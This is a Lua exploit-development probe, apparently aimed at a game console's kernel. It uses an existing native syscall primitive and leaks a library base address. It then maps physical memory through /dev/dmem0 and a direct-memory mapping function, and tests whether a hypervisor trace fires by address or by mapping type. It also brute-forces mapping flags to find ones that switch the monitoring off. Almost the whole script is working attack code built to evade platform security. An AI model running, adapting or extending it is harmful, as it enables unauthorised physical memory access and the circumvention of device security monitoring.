-- CRASH_CLASS: MODERATE
-- PROBE 563j: Is the trace triggered by PHYSICAL ADDRESS or MAPPING TYPE?
--
-- KEY QUESTION: dmem0 mmap at phys=0 is trace-free.
-- MapDM at phys=0x100000000 triggers trace on access.
-- If we MapDM at phys=0 (same address that works via dmem0):
-- - Trace fires → it's the MapDM mapping type that's monitored
-- - No trace → it's specific physical ranges that are monitored
--
-- ALSO TEST: various flags in the MapDM call (arg2=flags) that might
-- disable monitoring. And: mprotect the MapDM VA after mapping.
--
-- This is a DISCRIMINATING test — tells us where the trace lives.

print("=== PROBE 563j: MAPDM PHYS=0 TRACE TEST ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rb(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if not ok then return nil end
    local n = N(v); if n < 0 then n = n + 0x100000000 end; return n
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rb(N(ib) + 0x108) or 0; local lhi = rb(N(ib) + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)
print(string.format("lk=0x%X%08X", lhi, llo))
io.flush()

local PAGE = 0x4000

-- ============================================================
-- [A] CONTROL: dmem0 mmap at phys=0 (known trace-free)
-- ============================================================
print("[A] control: dmem0 mmap phys=0")
local dp = memory.alloc(16)
wd(N(dp), 0x7665642F); wd(N(dp) + 4, 0x656D642F); wd(N(dp) + 8, 0x0000306D)
local ok_o, fd_raw = pcall(function()
    return native.fcall_with_rax(stub, 5, dp, uint64(2))
end)
local dmem_fd = ok_o and N(fd_raw) or -999

if dmem_fd >= 0 then
    local ok_mm, va_raw = pcall(function()
        return mk(477)(Z, uint64(PAGE), uint64(3),
            uint64(0x0001), uint64(dmem_fd), Z)
    end)
    local va = ok_mm and N(va_raw) or 0
    if va > 0x10000 then
        local v0 = rb(va) or 0
        local v4 = rb(va + 4) or 0
        print(string.format("  va=0x%X data=%08X_%08X", va, v4, v0))
        print("  CONTROL_OK — no trace, data readable")
        pcall(function()
            native.fcall_with_rax(stub, 73, uint64(va), uint64(PAGE))
        end)
    end
    pcall(function() native.fcall_with_rax(stub, 6, uint64(dmem_fd)) end)
end
io.flush()

-- ============================================================
-- [B] TEST: MapDM at phys=0 → access VA
-- ============================================================
print("")
print("[B] MapDM phys=0 → userland access")
local va_test = uint64("0x880000000")

-- Reserve VA
pcall(function()
    native.fcall_with_rax(stub, 477,
        va_test, uint64(PAGE), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)

-- MapDM at phys=0
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        va_test, uint64(PAGE), uint64(3), Z,
        Z, uint64(PAGE))
end)
local md_rv = ok_md and N(rv_md) or -999
print("  mapdm rv=" .. md_rv)
io.flush()

if md_rv == 0 then
    print("  reading from MapDM VA (phys=0)...")
    io.flush()
    local ok_r, v0 = pcall(function()
        return memory.read_dword(N(va_test))
    end)
    if ok_r then
        local val = N(v0)
        if val < 0 then val = val + 0x100000000 end
        print(string.format("  READ OK! data=0x%08X", val))
        print("  *** NO TRACE — physical address determines trace, not mapping type! ***")
    else
        print("  READ FAILED (pcall caught crash)")
        print("  → trace is on MAPPING TYPE (MapDM always monitored)")
    end
    io.flush()
end

-- ============================================================
-- [C] TEST: MapDM at phys=0 → copyin (write to socketpair)
-- ============================================================
print("")
print("[C] MapDM phys=0 → copyin via write()")
local spbuf = memory.alloc(16)
wq(N(spbuf), Z)
pcall(function()
    native.fcall_with_rax(stub, 135,
        uint64(1), uint64(2), uint64(0), spbuf)
end)
local fd_a = rb(N(spbuf)) or -1
local fd_b = rb(N(spbuf) + 4) or -1

if fd_a >= 0 then
    local ok_w, rv_w = pcall(function()
        return native.fcall_with_rax(stub, 4,
            uint64(fd_a), va_test, uint64(16))
    end)
    local wr = ok_w and N(rv_w) or -999
    print("  write rv=" .. wr)

    if wr > 0 then
        local rbuf = memory.alloc(32)
        for i = 0, 28, 4 do wd(N(rbuf) + i, 0xEE) end
        pcall(function()
            native.fcall_with_rax(stub, 3,
                uint64(fd_b), rbuf, uint64(16))
        end)
        local r0 = rb(N(rbuf)) or 0
        local r4 = rb(N(rbuf) + 4) or 0
        print(string.format("  copyin data=%08X_%08X", r4, r0))
        print("  *** COPYIN WORKS FOR MAPDM+PHYS0! ***")
    else
        print("  copyin also EFAULT — MapDM PTE blocks ALL access paths")
    end
    pcall(function() native.fcall_with_rax(stub, 6, uint64(fd_a)) end)
    pcall(function() native.fcall_with_rax(stub, 6, uint64(fd_b)) end)
end
io.flush()

-- Unmap test VA
pcall(function()
    native.fcall_with_rax(stub, 73, va_test, uint64(PAGE))
end)

-- ============================================================
-- [D] MapDM with different flags (arg4)
-- ============================================================
print("")
print("[D] MapDM flag variations at phys=0")
local va_d = uint64("0x890000000")
local flag_tests = {0, 1, 2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800}

for _, fl in ipairs(flag_tests) do
    -- Reserve VA
    pcall(function()
        native.fcall_with_rax(stub, 477,
            va_d, uint64(PAGE), uint64(3),
            uint64(0x1012), uint64(0xFFFFFFFF), Z)
    end)

    local ok_m, rv_m = pcall(function()
        return native.fcall_with_rax(mapdm_fn, 0,
            va_d, uint64(PAGE), uint64(3), uint64(fl),
            Z, uint64(PAGE))
    end)
    local r = ok_m and N(rv_m) or -999
    local status = "rv=" .. r

    if r == 0 then
        -- Quick copyin test
        local sp2 = memory.alloc(16)
        wq(N(sp2), Z)
        pcall(function()
            native.fcall_with_rax(stub, 135,
                uint64(1), uint64(2), uint64(0), sp2)
        end)
        local fa = rb(N(sp2)) or -1
        local fb = rb(N(sp2) + 4) or -1
        if fa >= 0 then
            local ok_w2, rv_w2 = pcall(function()
                return native.fcall_with_rax(stub, 4,
                    uint64(fa), va_d, uint64(8))
            end)
            local w = ok_w2 and N(rv_w2) or -999
            if w > 0 then
                local rb2 = memory.alloc(16)
                pcall(function()
                    native.fcall_with_rax(stub, 3, uint64(fb), rb2, uint64(8))
                end)
                local q0 = rb(N(rb2)) or 0
                status = string.format("rv=0 COPYIN_OK data=0x%08X", q0)
            else
                status = "rv=0 copyin_fail"
            end
            pcall(function() native.fcall_with_rax(stub, 6, uint64(fa)) end)
            pcall(function() native.fcall_with_rax(stub, 6, uint64(fb)) end)
        end
    end

    -- Unmap
    pcall(function()
        native.fcall_with_rax(stub, 73, va_d, uint64(PAGE))
    end)

    print(string.format("  flags=0x%03X: %s", fl, status))
end

io.flush()
local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid and " ALIVE" or " DEAD"))
print("=== 563j DONE ===")
